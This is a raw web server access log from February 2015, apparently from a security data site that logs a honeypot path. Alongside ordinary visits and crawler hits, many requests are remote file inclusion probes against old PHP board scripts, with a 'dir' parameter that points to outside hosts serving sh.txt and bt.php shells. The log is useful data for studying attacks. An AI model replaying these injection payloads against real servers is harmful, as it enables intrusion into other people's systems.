69.255.52.103 - - [13/Feb/2015:16:39:36 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" 
69.255.52.103 - - [13/Feb/2015:16:39:36 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4" 
71.6.150.241 - - [13/Feb/2015:16:50:32 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:50:33 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:50:33 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:50:34 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:50:35 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:50:36 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:50:36 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:50:37 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:56:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:57:00 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:57:00 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:57:01 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:57:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:57:03 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:57:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:16:57:04 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
37.115.186.0 - - [13/Feb/2015:17:01:25 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://banan.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; XMPP Tiscali Communicator v.10.0.2; .NET CLR 2.0.50727)" 
37.115.186.0 - - [13/Feb/2015:17:01:25 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://banan.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; XMPP Tiscali Communicator v.10.0.2; .NET CLR 2.0.50727)" 
37.115.186.0 - - [13/Feb/2015:17:01:26 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://banan.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; XMPP Tiscali Communicator v.10.0.2; .NET CLR 2.0.50727)" 
71.6.150.241 - - [13/Feb/2015:17:05:17 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:05:18 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:05:18 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:05:19 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:05:19 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:05:21 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:05:21 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:05:22 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
46.118.154.155 - - [13/Feb/2015:17:06:06 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://pml.dp.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; x64; SV1; .NET CLR 2.0.50727)" 
46.118.154.155 - - [13/Feb/2015:17:06:07 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://pml.dp.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; x64; SV1; .NET CLR 2.0.50727)" 
46.118.154.155 - - [13/Feb/2015:17:06:07 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://pml.dp.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; x64; SV1; .NET CLR 2.0.50727)" 
71.6.150.241 - - [13/Feb/2015:17:36:28 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:36:29 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:36:29 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:36:30 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:36:30 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:36:31 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:36:32 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:17:36:33 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
66.249.65.195 - - [13/Feb/2015:18:16:16 -0800] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.73.135 - - [13/Feb/2015:18:16:16 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.65.195 - - [13/Feb/2015:18:16:16 -0800] "GET / HTTP/1.1" 301 482 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.34.26.83 - - [13/Feb/2015:18:32:04 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" 
208.69.32.24 - - [13/Feb/2015:18:36:22 -0800] "GET / HTTP/1.1" 200 6732 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7" 
208.69.32.24 - - [13/Feb/2015:18:36:22 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27732 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7" 
54.85.159.124 - - [13/Feb/2015:18:46:38 -0800] "HEAD / HTTP/1.1" 200 295 "-" "Mozilla/6.0 (compatible; MSIE 5.5; Windows NT 6.0)" 
69.12.77.131 - - [13/Feb/2015:19:05:35 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1" 
100.43.91.10 - - [13/Feb/2015:19:54:42 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.91.10 - - [13/Feb/2015:19:54:44 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
104.130.161.117 - - [13/Feb/2015:20:33:00 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [13/Feb/2015:20:33:00 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [13/Feb/2015:20:33:02 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.116 - - [13/Feb/2015:20:33:02 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [13/Feb/2015:20:33:06 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.115 - - [13/Feb/2015:20:33:06 -0800] "GET /bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [13/Feb/2015:20:33:07 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 301 491 "-" "Tornado-Async-Client" 
104.130.161.115 - - [13/Feb/2015:20:33:07 -0800] "GET /bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [13/Feb/2015:20:35:24 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [13/Feb/2015:20:35:24 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [13/Feb/2015:20:35:26 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [13/Feb/2015:20:35:26 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [13/Feb/2015:20:35:30 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.113 - - [13/Feb/2015:20:35:30 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [13/Feb/2015:20:35:31 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.113 - - [13/Feb/2015:20:35:31 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
181.197.54.189 - - [13/Feb/2015:20:41:22 -0800] "GET / HTTP/1.1" 301 483 "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
181.197.54.189 - - [13/Feb/2015:20:41:22 -0800] "GET / HTTP/1.1" 200 6788 "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
181.197.54.189 - - [13/Feb/2015:20:41:23 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
164.85.131.130 - - [13/Feb/2015:20:52:18 -0800] "GET /self.logs/access.log.2015-01-31.gz HTTP/1.1" 304 188 "-" "Mozilla/4.0 (compatible;)" 
91.121.6.123 - - [13/Feb/2015:20:56:54 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
91.121.6.123 - - [13/Feb/2015:20:56:55 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
80.68.145.110 - - [13/Feb/2015:20:56:56 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
91.121.6.123 - - [13/Feb/2015:20:56:56 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
80.68.145.110 - - [13/Feb/2015:20:56:57 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
71.6.150.241 - - [13/Feb/2015:20:56:57 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
80.68.145.110 - - [13/Feb/2015:20:56:57 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
91.121.6.123 - - [13/Feb/2015:20:56:57 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
71.6.150.241 - - [13/Feb/2015:20:56:58 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
80.68.145.110 - - [13/Feb/2015:20:56:58 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
71.6.150.241 - - [13/Feb/2015:20:56:59 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:20:56:59 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:20:57:00 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:20:57:00 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:20:57:01 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:20:57:02 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
91.121.6.123 - - [13/Feb/2015:20:57:02 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
91.121.6.123 - - [13/Feb/2015:20:57:03 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
80.68.145.110 - - [13/Feb/2015:20:57:04 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
80.68.145.110 - - [13/Feb/2015:20:57:05 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
80.68.145.110 - - [13/Feb/2015:20:57:05 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
80.68.145.110 - - [13/Feb/2015:20:57:07 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
112.218.68.155 - - [13/Feb/2015:20:57:07 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
71.6.150.241 - - [13/Feb/2015:20:57:08 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
1.224.163.80 - - [13/Feb/2015:20:57:08 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
71.6.150.241 - - [13/Feb/2015:20:57:09 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
71.6.150.241 - - [13/Feb/2015:20:57:09 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
1.224.163.80 - - [13/Feb/2015:20:57:10 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
71.6.150.241 - - [13/Feb/2015:20:57:10 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)" 
1.224.163.80 - - [13/Feb/2015:20:57:10 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
1.224.163.80 - - [13/Feb/2015:20:57:12 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:20:57:12 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
91.121.6.123 - - [13/Feb/2015:20:57:13 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
176.31.252.38 - - [13/Feb/2015:20:57:13 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [13/Feb/2015:20:57:13 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [13/Feb/2015:20:57:14 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:20:57:14 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
91.121.6.123 - - [13/Feb/2015:20:57:14 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
91.121.6.123 - - [13/Feb/2015:20:57:14 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
91.121.6.123 - - [13/Feb/2015:20:57:14 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
176.31.252.38 - - [13/Feb/2015:20:57:14 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [13/Feb/2015:20:57:15 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [13/Feb/2015:20:57:15 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [13/Feb/2015:20:57:15 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
91.121.6.123 - - [13/Feb/2015:20:57:15 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
91.121.6.123 - - [13/Feb/2015:20:57:15 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
91.121.6.123 - - [13/Feb/2015:20:57:15 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
176.31.252.38 - - [13/Feb/2015:20:57:16 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [13/Feb/2015:20:57:16 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
91.121.6.123 - - [13/Feb/2015:20:57:17 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
91.121.6.123 - - [13/Feb/2015:20:57:17 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
176.31.252.38 - - [13/Feb/2015:20:57:17 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [13/Feb/2015:20:57:17 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
1.224.163.80 - - [13/Feb/2015:20:57:17 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [13/Feb/2015:20:57:17 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
